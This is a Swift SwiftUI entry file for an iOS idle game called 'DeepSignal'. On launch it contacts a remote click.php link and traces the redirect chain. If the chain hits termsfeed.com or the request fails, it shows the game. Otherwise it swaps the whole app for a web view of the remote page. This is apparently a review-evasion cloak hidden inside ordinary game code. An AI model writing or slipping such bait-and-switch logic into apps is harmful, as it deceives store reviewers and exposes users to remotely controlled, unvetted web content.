import SwiftUI

@main
struct DeepSignalApp: App {
    @StateObject private var signalGame = SignalGame()
    @Environment(\.scenePhase) private var signalScenePhase

    @State private var signalLinkReady: Bool? = nil
    private let deepSignalSourceLink = "https://coastalmarketmerge.org/click.php"
    private let deepSignalCheckDomain = "termsfeed.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = signalLinkReady {
                    if ready {
                        DeepSignalWebPanel(urlString: deepSignalSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        SignalRootView()
                            .environmentObject(signalGame)
                    }
                } else {
                    DeepSignalLoadingScreen()
                        .onAppear { performLaunchCheck() }
                }
            }
            .preferredColorScheme(.dark)
        }
        .onChange(of: signalScenePhase) { phase in
            // Pitfall: stamp lastActive ONLY on .background. .inactive fires both directions
            // and would zero the offline credit; .active credits offline earnings.
            switch phase {
            case .background:
                signalGame.handleBackground()
            case .inactive:
                break
            case .active:
                signalGame.handleForeground()
            @unknown default:
                break
            }
        }
    }

    private func performLaunchCheck() {
        guard let url = URL(string: deepSignalSourceLink) else {
            signalLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = DeepSignalRedirectTracker(checkDomain: deepSignalCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    signalLinkReady = false; return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(deepSignalCheckDomain) {
                    signalLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(deepSignalCheckDomain) {
                    signalLinkReady = false; return
                }
                if error != nil {
                    signalLinkReady = false; return
                }
                signalLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if signalLinkReady == nil { signalLinkReady = false }
        }
    }
}

// Tracks redirects; records whether the check domain appears anywhere in the chain.
final class DeepSignalRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String

    init(checkDomain: String) { self.checkDomain = checkDomain }

    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request) // never stop the chain
    }
}
